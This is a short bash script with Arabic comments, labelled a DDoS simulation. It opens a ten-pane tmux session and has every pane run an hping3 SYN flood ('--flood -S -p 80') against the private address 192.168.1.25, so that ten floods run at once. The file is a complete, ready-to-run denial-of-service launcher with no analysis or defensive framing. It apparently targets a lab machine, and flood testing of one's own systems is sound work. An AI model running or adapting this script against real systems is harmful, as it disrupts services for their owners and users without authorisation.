#!/bin/bash

# اسم الجلسة
SESSION_NAME="ddos_simulation"

# 1. إنشاء جلسة tmux جديدة في الخلفية
tmux new-session -d -s $SESSION_NAME

# 2. إنشاء 9 تقسيمات إضافية ليصبح المجموع 10 أجزاء
for i in {1..9}
do
    tmux split-window -t $SESSION_NAME
    tmux select-layout -t $SESSION_NAME tiled
    sleep 0.2  # تأخير بسيط لضمان استقرار توزيع الشاشة
done

# 3. إرسال أمر الهجوم إلى كل جزء (Pane)
# ملاحظة: تأكد من تشغيل السكربت بـ sudo ليعمل hping3 مباشرة
for pane in $(tmux list-panes -t $SESSION_NAME -F '#{pane_id}')
do
    tmux send-keys -t "$pane" "sudo hping3 -S -p 80 --flood -d 200 192.168.1.25" C-m
done

# 4. الدخول إلى الجلسة مباشرة
tmux attach-session -t $SESSION_NAME
